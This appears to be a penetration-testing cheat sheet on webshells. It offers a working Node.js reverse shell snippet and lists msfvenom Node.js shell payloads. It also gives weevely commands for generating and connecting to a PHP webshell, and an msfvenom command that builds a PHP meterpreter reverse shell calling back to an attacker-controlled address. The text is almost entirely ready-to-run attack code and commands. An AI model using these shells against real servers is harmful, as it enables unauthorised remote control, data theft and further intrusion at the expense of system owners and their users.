# Webshells

## Javascript

The following can be used as a general platform independent reverse shell:

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the node.js application from crashing
})();
```

Source: [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)  
Source: [https://github.com/evilpacket/node-shells/blob/master/node\_revshell.js](https://github.com/evilpacket/node-shells/blob/master/node_revshell.js)

We can also use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate encoded reverse shells.

### msfvenom

```
nodejs/shell_bind_tcp
nodejs/shell_reverse_tcp
nodejs/shell_reverse_tcp_ssl
```

## PHP

These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.

### weevely

Using weevely we can create php webshells:

```
weevely generate password /root/webshell.php
```

Now we execute it, point it to the remote page and get a shell in return:

```
weevely "http://192.168.1.101/webshell.php" password
```

### msfvenom

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```



